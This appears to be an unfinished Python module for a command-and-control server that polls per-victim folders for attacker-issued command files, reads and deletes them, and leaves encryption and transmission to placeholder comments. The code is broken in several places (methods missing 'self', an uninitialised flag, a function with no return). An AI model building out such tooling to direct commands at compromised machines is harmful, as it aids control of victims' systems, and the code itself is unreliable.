"""Module designed to monitor commands issued by attacker to queue
"""
from threading import Thread, Timer
# from ..utils.consts import DEFAULT_DATA_DIR, DEFAULT_CMD_FILE

import math
import os
import time

class CommandQueue():

    def __init__(self, directory, command_file):
        
        self.dir = directory
        self.command_file = command_file
        self.victim_dirs = []
        self.t = None

    def start_listening():
        self.t = Thread(target = self._watch)
        self.t.start()

    def stop_listening():
        self.can_watch = False
        self.t.join()

    def _watch(self):
        """Watch subdirectories for commands to send to the victims
        """
        if self.can_watch:
            Timer(60, self._watch).start()

        # Refresh victim dirs
        self.victim_dirs = self._get_victim_dirs()

        # Iterate over directories and read command file
        for dir in self.victim_dirs:
            if os.path.isfile(dir + '/input/' + self.command_file):
                with open(dir + '/input/' + self.command_file, 'r') as f:
                    commands = []
                    for line in f:
                        commands.append(line)

                    print(commands)

                    # Encrypt the commands

                    # Prepare for transmission

                os.remove(dir + '/input/' + self.command_file) # Done reading file

        time.sleep(60)


        pass

    def _get_victim_dirs(self):
        """Get corresponding victims that connected to the server
        """
        res = []
        root = os.path.dirname(__file__)
        for victim in os.listdir(self.dir):
            if os.path.isdir(os.path.join(root + self.dir, victim)):
                res.append(os.path.join(root + self.dir, victim))
